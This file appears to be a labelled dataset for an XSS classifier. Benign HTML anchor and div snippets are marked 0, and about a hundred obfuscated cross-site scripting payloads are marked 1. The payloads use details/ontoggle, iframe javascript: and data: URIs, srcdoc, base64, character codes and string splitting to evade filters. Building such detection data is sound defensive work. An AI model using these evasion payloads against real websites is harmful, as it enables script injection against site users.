"<a alt=""benign"">normal</a>",0
"<a alt=""benign"">sample</a>",0
"<a alt=""content"">benign</a>",0
"<a alt=""content"">sample</a>",0
"<a alt=""hello"">benign</a>",0
"<a alt=""hello"">hello</a>",0
"<a alt=""hello"">test</a>",0
"<a alt=""hello"">world</a>",0
"<a alt=""normal"">hello</a>",0
"<a alt=""test"">content</a>",0
"<a alt=""test"">sample</a>",0
"<a alt=""test"">test</a>",0
"<a alt=""world"">content</a>",0
"<a alt=""world"">test</a>",0
"<a alt=""world"">world</a>",0
"<a class=""benign"">hello</a>",0
"<a class=""benign"">normal</a>",0
"<a class=""benign"">sample</a>",0
"<a class=""benign"">test</a>",0
"<a class=""benign"">world</a>",0
"<a class=""content"">normal</a>",0
"<a class=""content"">sample</a>",0
"<a class=""hello"">content</a>",0
"<a class=""normal"">normal</a>",0
"<a class=""normal"">sample</a>",0
"<a class=""sample"">content</a>",0
"<a class=""sample"">hello</a>",0
"<a class=""sample"">world</a>",0
"<a class=""test"">normal</a>",0
"<a class=""world"">content</a>",0
"<a class=""world"">sample</a>",0
"<a class=""world"">world</a>",0
"<a href=""benign"">hello</a>",0
"<a href=""benign"">sample</a>",0
"<a href=""content"">hello</a>",0
"<a href=""content"">normal</a>",0
"<a href=""content"">sample</a>",0
"<a href=""hello"">hello</a>",0
"<a href=""hello"">test</a>",0
"<a href=""normal"">content</a>",0
"<a href=""normal"">normal</a>",0
"<a href=""normal"">test</a>",0
"<a href=""sample"">content</a>",0
"<a href=""world"">normal</a>",0
"<a href=""world"">test</a>",0
"<a href=""world"">world</a>",0
"<a id=""benign"">content</a>",0
"<a id=""content"">normal</a>",0
"<a id=""content"">world</a>",0
"<a id=""hello"">benign</a>",0
"<a id=""hello"">content</a>",0
"<a id=""hello"">hello</a>",0
"<a id=""normal"">benign</a>",0
"<a id=""normal"">normal</a>",0
"<a id=""normal"">world</a>",0
"<a id=""sample"">benign</a>",0
"<a id=""sample"">normal</a>",0
"<a id=""sample"">sample</a>",0
"<a id=""test"">normal</a>",0
"<a id=""world"">benign</a>",0
"<a id=""world"">content</a>",0
"<a src=""benign"">benign</a>",0
"<a src=""benign"">content</a>",0
"<a src=""benign"">sample</a>",0
"<a src=""benign"">test</a>",0
"<a src=""benign"">world</a>",0
"<a src=""content"">benign</a>",0
"<a src=""content"">world</a>",0
"<a src=""hello"">benign</a>",0
"<a src=""hello"">world</a>",0
"<a src=""normal"">content</a>",0
"<a src=""normal"">world</a>",0
"<a src=""sample"">benign</a>",0
"<a src=""sample"">content</a>",0
"<a src=""sample"">normal</a>",0
"<a src=""sample"">sample</a>",0
"<a src=""test"">benign</a>",0
"<a src=""test"">normal</a>",0
"<a src=""test"">sample</a>",0
"<a src=""world"">test</a>",0
"<a style=""benign"">content</a>",0
"<a style=""benign"">hello</a>",0
"<a style=""content"">benign</a>",0
"<a style=""content"">content</a>",0
"<a style=""content"">hello</a>",0
"<a style=""content"">sample</a>",0
"<a style=""hello"">benign</a>",0
"<a style=""hello"">hello</a>",0
"<a style=""hello"">test</a>",0
"<a style=""hello"">world</a>",0
"<a style=""normal"">benign</a>",0
"<a style=""normal"">sample</a>",0
"<a style=""normal"">world</a>",0
"<a style=""sample"">hello</a>",0
"<a style=""sample"">normal</a>",0
"<a style=""sample"">sample</a>",0
"<a style=""test"">hello</a>",0
"<a style=""world"">benign</a>",0
"<a style=""world"">world</a>",0
"<a title=""benign"">content</a>",0
"<a title=""benign"">hello</a>",0
"<a title=""benign"">test</a>",0
"<a title=""content"">sample</a>",0
"<a title=""content"">test</a>",0
"<a title=""hello"">test</a>",0
"<a title=""normal"">hello</a>",0
"<a title=""normal"">world</a>",0
"<a title=""sample"">benign</a>",0
"<a title=""sample"">hello</a>",0
"<a title=""test"">normal</a>",0
"<a title=""test"">world</a>",0
"<a title=""world"">normal</a>",0
"<a title=""world"">sample</a>",0
<details ontoggle=eval(decodeURIComponent('%61%6C%65%72%74%28%31%29')) open>,1
"<details open ontoggle=""&#97;&#108;&#101;&#114;&#116;(1)""></details>",1
"<details open ontoggle=""eval(String.fromCharCode(97,108,101,114,116,40,49,41))""></details>",1
"<details open ontoggle=""setTimeout('al'+'ert(1)',0)""></details>",1
"<details open ontoggle=""window['al'+'ert']('XSS')""></details>",1
"<details open ontoggle=""window['al'+'ert'](1)""></details>",1
"<details open ontoggle='(window.Function(atob(""YWxlcnQoMSk="")))()'></details>",1
"<details open ontoggle='eval(""al""+""ert(1)"")'></details>",1
"<details open ontoggle='eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))'></details>",1
"<details open ontoggle='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'></details>",1
"<details open ontoggle='eval(atob(""YWxlcnQoMSk=""))'></details>",1
"<details open ontoggle='new Function(""al""+""ert(1)"")()'></details>",1
"<details open ontoggle='window[[[""\x61"",""\x6c"",""\x65"",""\x72"",""\x74""].join("""")]](1)'></details>",1
<details open ontoggle=Function('\u0061\u006c\u0065\u0072\u0074(1)')()></details>,1
<details open ontoggle=Function('al'+'ert(1)')()></details>,1
<details open ontoggle=eval('al'+'ert(1)')></details>,1
<details open ontoggle=eval('al'+'ert(3)')>,1
"<details open ontoggle=eval('window[""al""+""ert""](1)')>",1
"<details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",1
"<details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></details>",1
"<details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,50,41))>",1
<details open ontoggle=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)>,1
<details open ontoggle=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)></details>,1
<details open ontoggle=eval(`window['al'+'ert'](1)`)>,1
<details open ontoggle=eval(atob('YWxlcnQoMSk='))>,1
<details open ontoggle=eval(atob('YWxlcnQoMSk='))></details>,1
<details open ontoggle=eval(atob('YWxlcnQoMik='))>,1
<details open ontoggle=eval(atob('YWxlcnQoNyk='))>,1
<details open ontoggle=eval(decodeURI('%61%6C%65%72%74%28%31%29'))></details>,1
<details open ontoggle=eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))>,1
<details open ontoggle=eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))></details>,1
<details open ontoggle=eval(decodeURIComponent('%61%6c%65%72%74(1)'))>,1
<details open ontoggle=eval(decodeURIComponent('\u0061\u006c\u0065\u0072\u0074(1)'))></details>,1
"<details open ontoggle=setTimeout('\u0061\u006c\u0065\u0072\u0074(1)',0)>",1
"<details open ontoggle=setTimeout(`al`+`ert(1)`,0)></details>",1
"<details open ontoggle=setTimeout(eval('String.fromCharCode(97,108,101,114,116,40,49,41)'),0)></details>",1
"<details open ontoggle=window[''+String.fromCharCode(97,108,101,114,116)](1)>",1
<details open ontoggle=window['\u0061\u006c\u0065\u0072\u0074'](1)></details>,1
<details open ontoggle=window['a'+'l'+'ert'](1)>,1
<details open ontoggle=window['a'+'lert'](1)>,1
<details open ontoggle=window['al'+'\u0065rt'](1)>,1
<details open ontoggle=window['al'+'\x65rt'](1)>,1
<details open ontoggle=window['al'+'ert'](1)>,1
<details open ontoggle=window['al'+'ert'](1)></details>,1
<details open ontoggle=window['al\x65rt'](1)>,1
"<details open ontoggle=window[String.fromCharCode(97,108,101,114,116)](1)>",1
<details open ontoggle=window[`al`+`ert`](1)>,1
<details open ontoggle=window[`al`+`ert`](1)></details>,1
<details open ontoggle=window[atob('YWxlcnQ=')](1)></details>,1
"<div alt=""benign"">benign</div>",0
"<div alt=""benign"">sample</div>",0
"<div alt=""content"">benign</div>",0
"<div alt=""content"">normal</div>",0
"<div alt=""content"">sample</div>",0
"<div alt=""hello"">benign</div>",0
"<div alt=""hello"">test</div>",0
"<div alt=""normal"">benign</div>",0
"<div alt=""normal"">hello</div>",0
"<div alt=""sample"">hello</div>",0
"<div alt=""sample"">normal</div>",0
"<div alt=""test"">benign</div>",0
"<div alt=""test"">hello</div>",0
"<div alt=""test"">test</div>",0
"<div alt=""test"">world</div>",0
"<div alt=""world"">benign</div>",0
"<div alt=""world"">hello</div>",0
"<div class=""benign"">content</div>",0
"<div class=""content"">benign</div>",0
"<div class=""content"">content</div>",0
"<div class=""content"">sample</div>",0
"<div class=""content"">test</div>",0
"<div class=""hello"">benign</div>",0
"<div class=""hello"">content</div>",0
"<div class=""hello"">sample</div>",0
"<div class=""hello"">test</div>",0
"<div class=""hello"">world</div>",0
"<div class=""normal"">hello</div>",0
"<div class=""normal"">normal</div>",0
"<div class=""normal"">sample</div>",0
"<div class=""normal"">world</div>",0
"<div class=""sample"">hello</div>",0
"<div class=""sample"">sample</div>",0
"<div class=""test"">benign</div>",0
"<div class=""test"">content</div>",0
"<div class=""test"">hello</div>",0
"<div class=""test"">sample</div>",0
"<div class=""test"">test</div>",0
"<div class=""test"">world</div>",0
"<div class=""world"">content</div>",0
"<div class=""world"">normal</div>",0
"<div class=""world"">sample</div>",0
"<div href=""benign"">content</div>",0
"<div href=""benign"">hello</div>",0
"<div href=""benign"">normal</div>",0
"<div href=""benign"">test</div>",0
"<div href=""content"">hello</div>",0
"<div href=""content"">test</div>",0
"<div href=""hello"">content</div>",0
"<div href=""hello"">normal</div>",0
"<div href=""hello"">sample</div>",0
"<div href=""normal"">normal</div>",0
"<div href=""sample"">benign</div>",0
"<div href=""test"">normal</div>",0
"<div href=""test"">sample</div>",0
"<div href=""test"">world</div>",0
"<div href=""world"">benign</div>",0
"<div href=""world"">normal</div>",0
"<div id=""content"">hello</div>",0
"<div id=""content"">normal</div>",0
"<div id=""content"">world</div>",0
"<div id=""hello"">content</div>",0
"<div id=""hello"">hello</div>",0
"<div id=""hello"">normal</div>",0
"<div id=""hello"">world</div>",0
"<div id=""normal"">benign</div>",0
"<div id=""sample"">benign</div>",0
"<div id=""sample"">world</div>",0
"<div id=""test"">content</div>",0
"<div id=""world"">benign</div>",0
"<div id=""world"">world</div>",0
"<div src=""benign"">benign</div>",0
"<div src=""benign"">content</div>",0
"<div src=""benign"">normal</div>",0
"<div src=""benign"">sample</div>",0
"<div src=""benign"">test</div>",0
"<div src=""content"">benign</div>",0
"<div src=""content"">content</div>",0
"<div src=""content"">hello</div>",0
"<div src=""content"">normal</div>",0
"<div src=""content"">test</div>",0
"<div src=""hello"">hello</div>",0
"<div src=""hello"">normal</div>",0
"<div src=""hello"">test</div>",0
"<div src=""normal"">content</div>",0
"<div src=""normal"">normal</div>",0
"<div src=""sample"">benign</div>",0
"<div src=""sample"">content</div>",0
"<div src=""sample"">test</div>",0
"<div src=""test"">normal</div>",0
"<div src=""test"">test</div>",0
"<div src=""world"">benign</div>",0
"<div src=""world"">normal</div>",0
"<div src=""world"">sample</div>",0
"<div style=""benign"">content</div>",0
"<div style=""benign"">normal</div>",0
"<div style=""benign"">sample</div>",0
"<div style=""benign"">test</div>",0
"<div style=""content"">content</div>",0
"<div style=""content"">sample</div>",0
"<div style=""content"">test</div>",0
"<div style=""hello"">benign</div>",0
"<div style=""hello"">hello</div>",0
"<div style=""hello"">normal</div>",0
"<div style=""hello"">world</div>",0
"<div style=""normal"">content</div>",0
"<div style=""normal"">normal</div>",0
"<div style=""normal"">world</div>",0
"<div style=""sample"">benign</div>",0
"<div style=""sample"">normal</div>",0
"<div style=""sample"">world</div>",0
"<div style=""test"">normal</div>",0
"<div style=""world"">benign</div>",0
"<div style=""world"">content</div>",0
"<div style=""world"">hello</div>",0
"<div style=""world"">normal</div>",0
"<div style=""world"">sample</div>",0
"<div title=""benign"">sample</div>",0
"<div title=""content"">normal</div>",0
"<div title=""content"">test</div>",0
"<div title=""hello"">normal</div>",0
"<div title=""normal"">benign</div>",0
"<div title=""normal"">test</div>",0
"<div title=""sample"">benign</div>",0
"<div title=""test"">content</div>",0
"<div title=""test"">hello</div>",0
"<div title=""test"">normal</div>",0
"<div title=""world"">benign</div>",0
"<div title=""world"">hello</div>",0
"<div title=""world"">sample</div>",0
"<iframe onload=""eval(atob('YWxlcnQoJ1hTUycp'))""></iframe>",1
"<iframe sRcDoC=""<img src=x onerror=window[unescape(escape`alert`)](00)>""></iframe>",1
"<iframe src=""data:text/html,<body onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></body>"">",1
"<iframe src=""data:text/html,<body onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></body>""></iframe>",1
"<iframe src=""data:text/html,<body onload=eval(atob('YWxlcnQoMSk='))></body>"">",1
"<iframe src=""data:text/html,<body onload=eval(atob('YWxlcnQoMSk='))></body>""></iframe>",1
"<iframe src=""data:text/html,<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></svg>"">",1
"<iframe src=""data:text/html,<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></svg>""></iframe>",1
"<iframe src=""data:text/html,<svg onload=eval(atob('YWxlcnQoMSk='))></svg>"">",1
"<iframe src=""data:text/html,<svg onload=eval(atob('YWxlcnQoMSk='))></svg>""></iframe>",1
"<iframe src=""data:text/html,<svg%20onload=%61lert%281%29>"">",1
"<iframe src=""data:text/html;base64,PGltZyBzcmM9IiIgb25lcnJvcj1hbGVydCgxKT4="">",1
"<iframe src=""data:text/html;base64,PGltZyBzcmM9XCIiIG9uZXJyb3I9YWxlcnQoMik+"">",1
"<iframe src=""data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+""></iframe>",1
"<iframe src=""data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+Cg=="">",1
"<iframe src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=""></iframe>",1
"<iframe src=""javascript:%61%6c%65%72%74%28%27%58%53%53%27%29""></iframe>",1
"<iframe src=""javascript:&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#x3a;&#97;&#108;&#101;&#114;&#116;&#x28;&#39;&#88;&#83;&#83;&#39;&#x29;"">",1
"<iframe src=""javascript:&#97l&#x65rt(('XSS'));"">",1
"<iframe src=""javascript:((()=>{window[`al`+`ert`](1)})())""></iframe>",1
"<iframe src=""javascript:\u0065val('al'+'ert(1)')""></iframe>",1
"<iframe src=""javascript:al&#101;rt('XSS')"">",1
"<iframe src=""javascript:al\u0065rt('XSS')""></iframe>",1
"<iframe src=""javascript:alert&#96;XSS&#96;"">",1
"<iframe src=""javascript:eval('\x61\x6c\x65\x72\x74(3)')"">",1
"<iframe src=""javascript:eval('\x61\x6c\x65\x72\x74\x28\x60\x31\x60\x29')"">",1
"<iframe src=""javascript:eval('alert(' + String.fromCharCode(49) + ')')"">",1
"<iframe src=""javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))""></iframe>",1
"<iframe src=""javascript:eval(atob('YWxlcnQoIlhTUyIp'))""></iframe>",1
"<iframe src=""javascript:eval(atob('YWxlcnQoMSk='))"">",1
"<iframe src=""javascript:eval(atob('YWxlcnQoMSk='))""></iframe>",1
"<iframe src=""javascript:eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))""></iframe>",1
"<iframe src=""javascript:eval(unescape('%61%6c%65%72%74%28%31%29'))""></iframe>",1
"<iframe src=""javascript:func=setTimeout;funp='ale';c=unescape('%72%74(1)');func(funp+c)"">",1
"<iframe src=""javascript:new Function('al'+'ert(`XSS`)')()"">",1
"<iframe src=""javascript:var script=document.createElement('script');script.innerText=String.fromCharCode(97,108,101,114,116,40,52,50,41);document.body.appendChild(script)""></iframe>",1
"<iframe src=""javascript:void (window[`ale`+'rt']('XSS'))"">",1
"<iframe src=""javascript:window['\x61\x6c\x65\x72\x74'](1)"">",1
"<iframe src=""javascript:window['al'+'ert'](1)"">",1
"<iframe src=""javascript:window[`al`+`ert`](1)""></iframe>",1
"<iframe src=""javascript:x='alert';window[x](64);""></iframe>",1
"<iframe src='data:text/html,<script>eval(atob(""YWxlcnQoJ0gzUicp""))</script>'></iframe>",1
"<iframe src='data:text/html;base64,PHNjcmlwdD53aW5kb3dbJ2FsZXJ0J10oMSk8L3NjcmlwdD4='>",1
"<iframe src='data:text/html;base64,PHNjcmlwdD5ldmFsKCdhbGVydCgxKScpPC9zY3JpcHQ+'>",1
"<iframe src='data:text/html;base64,PHNjcmlwdD5ldmFsKCdhbGVydCgyKScpPC9zY3JpcHQ+'>",1
"<iframe src='javascri&#x70;t:eval(String.fromCharCode(97,108,101,114,116,40,39,77,83,71,39,41))'>",1
"<iframe src='javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))'></iframe>",1
"<iframe src='javascript:eval(String.fromCharCode(97,108,101,114,116,40,48,41))'></iframe>",1
"<iframe src=data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+>",1
"<iframe src=javascript:\u0065val(setTimeout(""\x61lert(1)"",1))>",1
"<iframe src=javascript:alert.bind(null,1)()>",1
"<iframe srcdoc=""&lt;img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#39;&#88;&#83;&#83;&#39;&#x29;&gt;"">",1
"<iframe srcdoc=""<body onload=eval('al'+'ert(1)')>""></iframe>",1
"<iframe srcdoc=""<body onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"">",1
"<iframe srcdoc=""<body onload=eval(atob('YWxlcnQoMSk='))>"">",1
"<iframe srcdoc=""<body onload=eval(atob('YWxlcnQoMSk='))>""></iframe>",1
"<iframe srcdoc=""<body onload=eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))>"">",1
"<iframe srcdoc=""<details open ontoggle=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))></details>""></iframe>",1
"<iframe srcdoc=""<details open ontoggle=eval(decodeURIComponent('%61%6C%65%72%74(1)'))></details>""></iframe>",1
